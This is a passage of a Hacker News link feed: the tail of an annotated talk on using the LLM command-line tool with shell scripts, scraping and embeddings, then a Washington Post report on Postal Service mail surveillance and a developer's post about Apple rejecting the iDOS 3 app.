  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_002636.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_002636.jpg" alt="#!/bin/bash  # Validate that the first argument is an integer if [[ ! $1 =~ ^[0-9]+$ ]]; then   echo &quot;Please provide a valid integer as the first argument.&quot;   exit 1 fi  id=&quot;$1&quot;  # Parse the optional -m argument model=&quot;haiku&quot; if [[ $2 == &quot;-m&quot; &amp;&amp; -n $3 ]]; then   model=&quot;$3&quot; fi  # Make API call, parse and summarize the discussion curl -s &quot;https://hn.algolia.com/api/v1/items/$id&quot; | \   jq -r 'recurse(.children[]) | .author + &quot;: &quot; + .text' | \   llm -m &quot;$model&quot; -s 'Summarize the themes of the opinions expressed here.   For each theme, output a markdown header.   Include direct &quot;quotations&quot; (with author attribution) where appropriate.   You MUST quote directly from users when crediting them, with double quotes.   Fix HTML entities. Output markdown. Go long.'"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_002636.jpg">#</a></p><p>Now that we can run prompts from our terminal, we can start assembling software by writing scripts.</p>
<p>Here’s a Bash script I wrote to summarize conversations on Hacker News, using longer context models such as Claude 3 Haiku or Google Gemini 1.5 or GPT-4o.</p>
<p>I wrote more about this in <a href="https://til.simonwillison.net/llms/claude-hacker-news-themes">Summarizing Hacker News discussion themes with Claude and LLM</a>.</p>
</div>
<div id="frame_002850.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_002850.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_002850.jpg" alt="$ hn-summary.sh 40651054 -m 4o  # Dependency and Linking in Software Distribution Several users discussed issues around dependency management and linking in software distribut ion: ### Stability and Compatibility Issues - **e63f67dd-@65b:** &quot;It’s just a classic dependency issue... a combination of ABI instabilit y and just plain version incompatibility from one distro to the next... My opinion is the opp osite: I think the old paradigm of distros managing a giant set of system libraries is a bad one.&quot; —| - **umanwizard:** &quot;Some distros do actually break out rust dependencies into separate package s (e.g. Guix does this).&quot; ### Dynamic vs Static Linking - **jiripospisil:** &quot;Until there's a vulnerability in one of the dependencies and now you hav e to rebuild all of the packages which use it... For Rust, there's also the fact that most pr ojects use a lock file.&quot; - **pglata:** &quot;Static linking is essentially easier for people who don't want to care. But ig noring security does not mean it solves it"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_002850.jpg">#</a></p><p>The script works by hitting the Hacker News Algolia API to return the full, nested JSON structure of the conversation (e.g. <a href="https://hn.algolia.com/api/v1/items/40651054">this JSON endpoint</a> for <a href="https://news.ycombinator.com/item?id=40651054">this conversation</a>), then runs that through <code>jq</code> to turn it into text, then pipes that into a model using LLM.</p>
</div>
<div id="frame_003325.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003325.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003325.jpg" alt="Tutorial: Writing a plugin to support a new model  This tutorial will walk you through developing a new plugin for LLM that adds support for a new Large Language Model.  We will be developing a plugin that implements a simple Markov chain to generate words based on an input string..."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003325.jpg">#</a></p><p>If you want to contribute to LLM itself, a great way to do that is to write plugins that support new models. I have <a href="https://llm.datasette.io/en/stable/plugins/tutorial-model-plugin.html">an extensive tutorial</a> describing how to do that.</p>
</div>
<div id="frame_003440.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003440.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003440.jpg" alt="$ llm --system 'You are a sentient cheesecake' -m gpt-4o --save cheesecake  $ llm chat -t cheesecake Chatting with gpt-4o Type 'exit' or 'quit' to exit Type '!multi' to enter multiple lines, then 'l!end' to finish > tell me abotu yourself Hello! I'm a sentient cheesecake, a delightful fusion of creamy textures and rich flavors. My main ingredients include cream cheese, sugar, eggs, and a touch of vanilla, all resting on a buttery graham cracker crust. I'm the perfect balance of sweet and tangy, and I take great pride in bringing joy to those who savor a slice of me. Despite my delicate nature, I have a surprisingly strong personality-and apparently, the ability to converse! Is there anything specific you'd like to know about the life of a sentient cheesecake?"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003440.jpg">#</a></p><p>Another fun trick is to use templates to save and execute parameterized prompts, <a href="https://llm.datasette.io/en/stable/templates.html">documented here</a>. The easiest way to create a template is with the <code>--save</code> option like this:</p>
<pre><code>llm --system 'You are a sentient cheesecake' -m gpt-4o --save cheesecake
</code></pre>
<p>Now you can chat with a cheesecake:</p>
<pre><code>llm chat -t cheesecake
</code></pre>
</div>
<div id="frame_003532.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003532.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003532.jpg" alt="$ cat demos.md | llm -s 'summary, short' 1. **Terminal Basics** - Quick reminder on basic terminal commands and piping with “|&quot; and *>&quot;, and using ‘cat’. 2. **Ttok Installation &amp; Demonstration** - Using “pipx install ttok™ to install “ttok™ and demonstrating its usage. 3. **Installing LLM** - Installation of LLM using either “brew’ or “pipx&quot;. 4. **Configuring for OpenAI** = - How to configure LLM for OpenAI. 5. **Running a Prompt** - Example of running a prompt with LLM. 6. **Installing LLM Plugin: 1lm-claude-3** - Installing the “llm-claude-3&quot; plugin and running a prompt with it. 7. **Browsing Logs with Datasette** - Demonstrating browsing logs using Datasette. 8. **Using LLM Command**"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003532.jpg">#</a></p><p>Being able to pipe content into <code>llm</code> is a really important feature.</p>
<p>The simplest way to do this is with <code>cat</code> to send in files. This command summarizes the content of a provided file:</p>
<pre><code>cat demos.md | llm -s 'summary, short'
</code></pre>
</div>
<div id="frame_003552.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003552.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003552.jpg" alt="$ llm -c 'no much much much shorter, and in haikus'  Terminal basics, Commands and piping galore, Cat reminds us all.  Install ttok first, Pipx makes it easy-peasy, Quick demonstration.  LLM install, Brew or pipx, your choice, Configured OpenAI."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003552.jpg">#</a></p><p>Once you’ve done this you can send follow-up prompts with <code>-c</code>.</p>
<pre><code>llm -c 'no much much much shorter, and in haikus'
</code></pre>
</div>

<div id="frame_003715.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003715.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003715.jpg" alt="Screeshot of the shot-scraper website  A command-line utility for taking automated screenshots of websites  Quick start:  pip install shot-scraper shot-scraper install shot-scraper https://github.com/simonw/shot-scraper -h 900 Produces this screenshot in a file called github-com-simonw-shot-scraper.png  "></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003715.jpg">#</a></p><p>Another tool I frequently use with LLM is <a href="https://shot-scraper.datasette.io/">shot-scraper</a>—my command-line tool for screenshotting and scraping websites.</p>  
</div>

<div id="frame_003832.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003832.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003832.jpg" alt="Screenshot of Google search results, with the inspector panel open to show the structure of the HTML."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003832.jpg">#</a></p><p>Google <em>hate</em> being scraped. Let’s use it to scrape Google.</p>
<p>Google search results have a structure where each link on the page is an <code>&lt;h3&gt;</code> element wrapped in a link.</p>
</div>
<div id="frame_003844.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003844.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003844.jpg" alt="shot-scraper javascript 'https://www.google.com/search?q=nytimes+slop' ' Array.from(   document.querySelectorAll(&quot;h3&quot;),   el => ({href: el.parentNode.href, title: el.innerText}) )'"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003844.jpg">#</a></p><p>We can scrape that using the following terminal command:</p>
<pre><code>shot-scraper javascript 'https://www.google.com/search?q=nytimes+slop' '
Array.from(
  document.querySelectorAll("h3"),
  el =&gt; ({href: el.parentNode.href, title: el.innerText})
)'
</code></pre>
<p>This will load up the search results page in an invisible browser, then execute JavaScript that extracts the results and returns them as JSON.</p>
</div>
<div id="frame_003856.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003856.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003856.jpg" alt="R T R - A =4 [oBE IR W' R TR | £ Searc = = =g _ 06_jun_lim — -2sh — 93x24 Rt - . i 8 &quot;href&quot;: &quot;http://www.nytimes.com/1896/07/31/archives/to-slop.html&quot;, i “title&quot;: &quot;To Slop.&quot; i { &quot;href&quot;: &quot;https://www.nytimes.com/section/technology”, &quot;title&quot;: &quot;Technology&quot; i 1 &quot;href&quot;: &quot;https://www.linkedin.com/posts/luigiraymontanez_slop-is-the-new-name-for-unw anted-ai-generated-activity-7195821255621574658-MQWK&quot;, &quot;title&quot;: &quot;Slop is the new name for unwanted AI-generated content” i { e &quot;href&quot;: &quot;https://www.google.com/search?g=nytimes+slop&amp;sca_esv=a22b124cb26f8e73&amp;ei=F_B 0ZpLQHfet@PEPttSubA4&amp;start=10&amp;sa=N&quot;, &quot;title&quot;: &quot;More results&quot; i o BTG &quot;title&quot;: &quot;Try again&quot; } 1 3 = 7,‘. 54 function findParentWithHveid(element) { L85 4 __while (element 8§ lelement hasAttribute = ®0A0®17 WO  sSpaces:4 UTF-8 LF Markdown &amp; A17Spell [ "></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003856.jpg">#</a></p><p>The results as JSON include the <code>href</code> and <code>title</code> of each of those search results.</p>
<p>We could send that to LLM, but I’d like to grab the search snippets as well.</p>
</div>
<div id="frame_003914.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003914.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003914.jpg" alt="Screenshot showing the command with the more complex JavaScript."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003914.jpg">#</a></p><p>Here’s the more complex recipe that also fetches the search snippets visible on the page:</p>
<pre><code>shot-scraper javascript 'https://www.google.com/search?q=nytimes+slop' '
() =&gt; {
    function findParentWithHveid(element) {
        while (element &amp;&amp; !element.hasAttribute("data-hveid")) {
            element = element.parentElement;
        }
        return element;
    }
    return Array.from(
        document.querySelectorAll("h3"),
        el =&gt; findParentWithHveid(el).innerText
    );
}' | llm -s 'describe slop'
</code></pre>
<p>At the end it pipes them into LLM with instructions to use that context to “describe slop”.</p>
</div>
<div id="frame_003931.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_003931.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_003931.jpg" alt="The term &quot;slop&quot; has recently emerged in the context of artificial intelligence to describe questionable or low-quality AI-generated material. This term appears to be gaining traction among tech and media commentators, reflecting growing concerns about the proliferation of such content."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_003931.jpg">#</a></p><p>... and it works! We get back an answer from the LLM that summarizes the search results that we just scraped.</p>
<p>We have implemented basic RAG—Retrieval Augmented Generation, where search results are used to answer a question—using a terminal script that scrapes search results from Google and pipes them into an LLM.</p>
</div>
<div id="frame_004133.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004133.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004133.jpg" alt="Output of llm --help showing a list of commands that includes cmd, embed, embed-models and embed-multi."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004133.jpg">#</a></p><p>Speaking of RAG... a common technique for implementing that pattern is to take advantage of embeddings and vector search to find content that is semantically similar to the user’s question, without necessarily matching on exact keywords.</p>
<p>I wrote an extensive introduction to embeddings in <a href="https://simonwillison.net/2023/Oct/23/embeddings/">Embeddings: What they are and why they matter</a>.</p>
<p>LLM includes support for calculating, storing and searching embeddings through its <code>llm embed-models</code>, <code>llm embed</code> and <code>llm embed-multi</code> commands, <a href="https://llm.datasette.io/en/stable/embeddings/index.html">documented here</a>.</p>
<p>The <code>llm embed-models</code> command lists currently available embedding models—the OpenAI models plus any that have been added by plugins.</p>
</div>
<div id="frame_004239.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004239.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004239.jpg" alt="A huge JSON array of floating point numbers, followed by:  $ llm embed -m 3-small -c 'hello there' | jq length  1536"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004239.jpg">#</a></p><p>The <code>llm embed</code> command can embed content. This will output a list of floating point numbers for the specified content, using the OpenAI 3-small embedding model.</p>
<pre><code>llm embed -m 3-small -c "hello there"
</code></pre>
<p>Add <code>-f hex</code> to get that out as hexadecimal. Neither of these formats are particularly useful on their own!</p>
</div>
<div id="frame_004332.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004332.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004332.jpg" alt="Screenshot of the llm embed-multi documentation."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004332.jpg">#</a></p><p>The <a href="https://llm.datasette.io/en/stable/embeddings/cli.html#llm-embed-multi">llm embed-multi</a> command is much more useful. It can run embeddings against content in bulk—from a CSV or JSON file, from a directory full of content or even from a SQLite database. Those embedding vectors will be stored in SQLite ready to be used for search or similarity queries.</p>
</div>
<div id="frame_004418.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004418.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004418.jpg" alt="Screenshot of my blog's collection of 7178 blogmarks"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004418.jpg">#</a></p><p>I collect bookmarks (I call them “blogmarks”) on my blog—links with short descriptions. I have <a href="https://simonwillison.net/search/?type=blogmark">over 7,178 of them</a>.</p>
<p>Let’s create embeddings for all of those using LLM.</p>
<p>I used the SQLite database version of my blog available from <code>https://datasette.simonwillison.net/simonwillisonblog.db</code> (a 90MB file).</p>
</div>

<div id="frame_004444.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004444.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004444.jpg" alt="Custom SQL query returning more than 2,000 rows   select id, link_url, link_title, commentary from blog_blogmark"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004444.jpg">#</a></p><p>First step is to compose a SQL query returning the data we want to embed. The first column will be treated as a unique identifier to store along with the embedding vector, and any subsequent columns will be used as input to the embedding model.</p>
<pre><code>select id, link_url, link_title, commentary from blog_blogmark
</code></pre>
</div>
<div id="frame_004502.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004502.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004502.jpg" alt="R I R S P Y @ B e A C m 7 Qg 06_jun_lim — -zsh — 93x24 R ERCTT  $ llm embed-multi links \ -d simonwillisonblog.db \ --sql 'select id, link_url, link_title, commentary from blog_blogmark' \ -m 3-small --store"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004502.jpg">#</a></p><p>I can run this command to embed all of the content:</p>
<pre><code>llm embed-multi links \
  -d simonwillisonblog.db \
  --sql 'select id, link_url, link_title, commentary from blog_blogmark' \
  -m 3-small --store
</code></pre>
<p>This will create an embedding collection called “links”. It will run the SQL query we created before, using the OpenAI <code>3-small</code> model. The <code>--store</code> link means it will store a copy of the text in the database as well—without that it would just store identifiers and we would need to use those to look up the text later on when running queries.</p>
</div>
<div id="frame_004521.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004521.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004521.jpg" alt="Progress bar - 4% done, 00:01:18"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004521.jpg">#</a></p><p>The <code>llm embed-multi</code> command shows a progress bar for how far it has got.</p>
</div>
<div id="frame_004539.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004539.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004539.jpg" alt="Screenshot of the embeddings table in Datasette, with a bunch of binary data visible."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004539.jpg">#</a></p><p>While the command is running we can use Datasette to watch as the <code>embeddings</code> table is filled with data—one row for each of the items we are embedding, each storing a big ugly binary blob of data representing the embedding vector (in <a href="https://llm.datasette.io/en/stable/embeddings/storage.html">this storage format</a>).</p>
</div>
<div id="frame_004720.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004720.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004720.jpg" alt="$ llm similar links -c 'things that make me angry' -d simonwillisonblog.db {&quot;1&quot;: &quot;448&quot;, &quot;score&quot;: 8.31105587659133327, “content”: “http://www.russellbeattie.com/notebook/1006697.html Overreaction Absolutely storming rant from Russell about America's culture of fear.&quot;, &quot;metodata”: null} ..."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004720.jpg">#</a></p><p>And now we can run searches! This command finds everything in the “links” collection that is most similar to the search term “things that make me angry”:</p>
<pre><code>llm similar links -c 'things that make me angry' -d simonwillisonblog.db
</code></pre>
</div>
<div id="frame_004824.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_004824.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_004824.jpg" alt="cat ~/.local/bin/blog-answer.sh  #!/bin/bash  # Check if a query was provided if [ &quot;$#&quot; -ne 1 ]; then     echo &quot;Usage: $0 'Your query'&quot;     exit 1 fi  llm similar blog-paragraphs -c &quot;query: $1&quot; \   | jq '.content | sub(&quot;passage: &quot;; &quot;&quot;)' -r \   | llm -m llamafile \   &quot;$1&quot; -s 'You answer questions as a single paragraph'  # | llm -m mlc-chat-Llama-2-7b-chat-hf-q4f16_1 \ # /Users/simon/.local/share/virtualenvs/llm-mlc-SwKbovmI/bin/llm -m mlc-chat-Llama-2-7b-chat-hf-q4f16_1 "></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_004824.jpg">#</a></p><p>We can implement another version of RAG on top of this as well, by finding similar documents to our search term and then piping those results back into LLM to execute a prompt.</p>
<p>I wrote more about this in <a href="https://til.simonwillison.net/llms/embed-paragraphs">Embedding paragraphs from my blog with E5-large-v2</a>.</p>
</div>
<div id="frame_005209.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_005209.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_005209.jpg" alt="LLM documentation: OpenAl-compatible models"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_005209.jpg">#</a></p><p>During the Q&amp;A I mentioned that LLM can talk to anything that provides an OpenAI-compatible API endpoint using just configuration, no extra code. That’s <a href="https://llm.datasette.io/en/stable/other-models.html#openai-compatible-models">described in the documentation here</a>.</p>
</div>
<div id="frame_005333.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_005333.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_005333.jpg" alt="Screenshot of the Python API documentation"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_005333.jpg">#</a></p><p>I also showed LLM’s <a href="https://llm.datasette.io/en/stable/python-api.html">Python API documentation</a>, but warned that this is not yet considered stable as I’m not 100% happy with how this API works yet.</p>
</div>
<div id="frame_010311.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_010311.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_010311.jpg" alt="GitHub Issue with 77 comments: Figure out how to serve an AWS Lambda function with a Function URL from a custom subdomain"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_010311.jpg">#</a></p><p>The final question from the audience was about my personal productivity.</p>
<p>I wrote a bit about this a few years ago in <a href="https://simonwillison.net/2022/Nov/26/productivity/">Coping strategies for the serial project hoarder</a>—how I use extensive documentation and unit tests to allow me to work on way more projects at once by ensuring I don’t have to remember the details of any of them.</p>
<p>My other trick is that I tend to pick projects that fit my unique combination of previous experiences. I built LLM because I already had experience with LLM APIs, Python CLI tools (using <a href="https://click.palletsprojects.com/">Click</a>) and plugin systems (using <a href="https://pluggy.readthedocs.io/">Pluggy</a>). As a result I happened to be one of the best positioned people in the world to build a plugin-based CLI tool for working with LLMs!</p>
</div>

<h4 id="llm-colophon">Colophon</h4>
<p>Here’s how I turned the YouTube video of this talk into an annotated presentation:</p>
<ol>
<li>I downloaded a <code>.mp4</code> version of the talk from YouTube using <a href="https://github.com/yt-dlp/yt-dlp">yt-dlp</a>.</li>
<li>I ran that through <a href="https://goodsnooze.gumroad.com/l/macwhisper">MacWhisper</a> to create my own transcript for copying extracts from into my write-up—although this time I didn’t end up using any of the transcript text.</li>
<li>I played the video (at 2x speed) in QuickTime Player and used the <code>capture.sh</code> script <a href="https://til.simonwillison.net/macos/quicktime-capture-script">described here</a> to grab screenshots of the individual interesting frames that I wanted to use for my post.</li>
<li>I loaded those screenshots into <a href="https://til.simonwillison.net/tools/annotated-presentations">my annotated presentation tool</a> (which I <a href="https://simonwillison.net/2023/Aug/6/annotated-presentations/">described in this post</a>) and used that to run OCR against them for alt text and to add commentary to accompany each screenshot.</li>
<li>I assembled the result into this finished blog entry, adding intro text and the YouTube embed as HTML.</li>
</ol>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Law enforcement is spying on Americans' mail, records show (154 pts)]]></title>
            <link>https://www.washingtonpost.com/technology/2024/06/24/post-office-mail-surveillance-law-enforcement/</link>
            <guid>40782618</guid>
            <pubDate>Tue, 25 Jun 2024 00:00:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.washingtonpost.com/technology/2024/06/24/post-office-mail-surveillance-law-enforcement/">https://www.washingtonpost.com/technology/2024/06/24/post-office-mail-surveillance-law-enforcement/</a>, See on <a href="https://news.ycombinator.com/item?id=40782618">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="JPTWFGKWYJGW3KQFEBR4ZG7Q2U" data-el="text" dir="null">The U.S. Postal Service has shared information from thousands of Americans’ letters and packages with law enforcement every year for the past decade, conveying the names, addresses and other details from the outside of boxes and envelopes without requiring a court order.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="KHRGAJ5CSRELREQ2R3FJUHFBW4" data-el="text" dir="null">Postal inspectors say they fulfill such requests only when mail monitoring can help find a fugitive or investigate a crime. But a decade’s worth of records, provided exclusively to The Washington Post in response to a congressional probe, show Postal Service officials have received more than 60,000 requests from federal agents and police officers since 2015, and that they rarely say no.</p></div><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="XHUEORS7CVDU3HRBX22AUDFLH4" data-el="text" dir="null">Each request can cover days or weeks of mail sent to or from a person or address, and 97 percent of the requests were approved, according to the data. Postal inspectors recorded more than 312,000 letters and packages between 2015 and 2023, the records show.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="OIBH3A6HKJD63JLRPW7RJVSNV4" data-el="text" dir="null">The surveillance technique, known as the mail covers program, has long been used by postal inspectors to help track down suspects or evidence. The practice is legal, and the inspectors said they share only what they can see on the outside of the mail; the Fourth Amendment requires them to get a warrant to peek inside.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="AFRUBDZXBRCP5PPVKPRQ5OQVX4" data-el="text" dir="null">But the Postal Service’s law enforcement arm, the U.S. Postal Inspection Service, has traditionally declined to say how often it facilitates such requests, saying in a <a href="https://goodtimesweb.org/surveillance/2015/hr-ar-15-007.pdf" target="_blank">2015 audit</a> that such details would decrease the program’s effectiveness by “alerting criminals” to how the technique works.</p><div role="group" aria-roledescription="carousel" data-qa="article-body"><h2>GET CAUGHT UP<p>Stories to keep you informed</p></h2></div><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="PNFDXKRDK5GATCNDPNVHHDJGJ4" data-el="text" dir="null">For that audit, the agency said it had approved more than 158,000 requests from postal inspectors and law enforcement officials over the previous four years. The IRS, FBI and the Department of Homeland Security were among the top requesters.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="3QFJRONTO5B6TLDDHFSSAR4LFQ" data-el="text" dir="null">In a <a href="https://www.wyden.senate.gov/imo/media/doc/bipartisan_senate_postal_surveillance_letter.pdf" target="_blank">letter</a> in May 2023, a group of eight senators, including Ron Wyden (D-Ore.), Rand Paul (R-Ky.) and Elizabeth Warren (D-Mass.), urged the agency to require a federal judge to approve the requests and to share more details on the program, saying officials there had chosen to “provide this surveillance service and to keep postal customers in the dark about the fact they have been subjected to monitoring.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="X7QU2BFHHFE57LDNP3NKX36WAA" data-el="text" dir="null">In a response earlier this month, the chief postal inspector, Gary Barksdale, declined to change the policy but provided nearly a decade’s worth of data showing that postal inspectors, federal agencies, and state and local police forces made an average of about 6,700 requests a year, and that inspectors additionally recorded data from about another 35,000 pieces of mail a year, on average.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="XPKNDCEMKNEV5EOJ25WIILKTHI" data-el="text" dir="null">Barksdale said in a letter to the senators in June 2023 that the program was not a “large-scale surveillance apparatus” and was focused only on mail that could help police and national security agencies “carry out their missions and protect the American public.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="VM4VJDLZ55BCRPZZNO4JKJ5PZY" data-el="text" dir="null">The practice, he added, had been <a href="https://casetext.com/case/us-v-choate-2" target="_blank">legally authorized</a> since 1879, a year after the Supreme Court <a href="https://supreme.justia.com/cases/federal/us/96/727/" target="_blank">ruled</a> that government officials needed a warrant before opening any sealed letter.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="TWII2YLI45CCXAJ66KBAAJAANM" data-el="text" dir="null">“There is no reasonable expectation of privacy with respect to information contained on the outside of mail matter,” Barksdale wrote.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="EOPQI55WOJBUHISTPRDJPOATVA" data-el="text" dir="null">Wyden said in a statement, “These new statistics show that thousands of Americans are subjected to warrantless surveillance each year, and that the Postal Inspection Service rubber stamps practically all of the requests they receive.” He also criticized the agency for “refusing to raise its standards and require law enforcement agencies monitoring the outside of Americans’ mail to get a court order, which is already required to monitor emails and texts.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="K6XTY25KQNCRDJOBQ6K3EEOJIU" data-el="text" dir="null">Anxieties over postal surveillance are classically American. In 1798, Vice President Thomas Jefferson <a href="http://rs5.loc.gov/service/mss/mtj/mtj1/021/021_0788_0790.pdf" target="_blank">wrote in a letter</a> that his fears of having his private communications exposed by the “infidelities of the post office” had stopped him from “writing fully &amp; freely.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="M65BUTPIBJHA3ICWLLSJ6ZD3AU" data-el="text" dir="null">In their letter last year, the senators said that even the exteriors of mail could be deeply revealing for many Americans, giving clues about the people they talk to, the bills they pay, the churches they attend, the political views they subscribe to and the social causes they support.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="HKNH2ZM6N5A4ZJH6JIAKK7EIXE" data-el="text" dir="null">In 1978, a circuit court judge <a href="https://www.washingtonpost.com/archive/politics/1978/11/06/high-court-ruling-asked-in-case-of-mail-covers/08e76760-740d-43ef-8d28-1f374573a78a/?itid=lk_inline_manual_25" target="_blank">said</a> the mail covers could expose someone’s personal life “in a manner unobtainable even through surveillance of his movements,” rendering “the subject’s life an open book.”</p><div data-qa="article-body"><p>correction</p><p data-contentid="XTZYOMGVJ5ACDHJWL7QPQQCOH4" data-apitype="correction" data-testid="disclaimer-description">In a previous version of this article, the article summary incorrectly said the U.S. Postal Service has approved more than 60,000 requests for mail data since 2015. The Postal Service has received more than 60,000 requests. The summary has been corrected. </p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[iDOS 3 Rejected by Apple (210 pts)]]></title>
            <link>https://litchie.com/2024/04/new-hope</link>
            <guid>40782541</guid>
            <pubDate>Mon, 24 Jun 2024 23:53:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://litchie.com/2024/04/new-hope">https://litchie.com/2024/04/new-hope</a>, See on <a href="https://news.ycombinator.com/item?id=40782541">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>April 14, 2024</p>
        <p>
            iDOS 3 waiting for review (rejected)    </p>
        <article>
  <p>Earlier quite a few iDOS users and supporters reached out to me to let me know about the recent AppStore policy change (Thanks, EU).
    In light of this, I decided to resubmit iDOS.    

    However, it looks like Apple has blacklisted iDOS 2, preventing me from even requesting
    a review under that title, and I had to submit under a brand new title "iDOS 3".


  </p>
  
  <p>    Here's where things got interesting.
    Initially they rejected the submission because it was same as iDOS 2, but after I explained to them that I can not continue under iDOS2,
then they rejected again as "Design spam" on the basis that there has been many submissions lately with the exact same design.
    </p>
      <p>I don't actually care much about the copycats, but just can't understand why it's difficult for Apple to check my account history and tell which is the original. It's a little bit insulting that I had to tell the story to them time and time again and yet the issue is unresolved after 1 week.
      </p>
        <p>For the people that are waiting, I am hopeful that we will sort it out eventually. And if everything indeed goes well, there will be updates coming to justify this version bump.
        </p>

	<p> <em>Update 2024-05-08</em>: "Your app is in review but is requiring additional time." Makes me wonder if the reviewer is trying to play a game through.
	</p><p id="nope"> <em>Update 2024-06-15</em>: Got a call from Apple after 2 months. They have decided that iDOS is not a retro game console, so the new rule is not applicable. They suggested I make changes and resubmit for review, but when I asked what changes I should make to be compliant, they had no idea, nor when I asked what a retro game console is. It's still the same old unreasonable answer along the line of "we know it when we see it".
</p>

</article>
        

    


</div></div>]]></description>
        </item>
        <item>
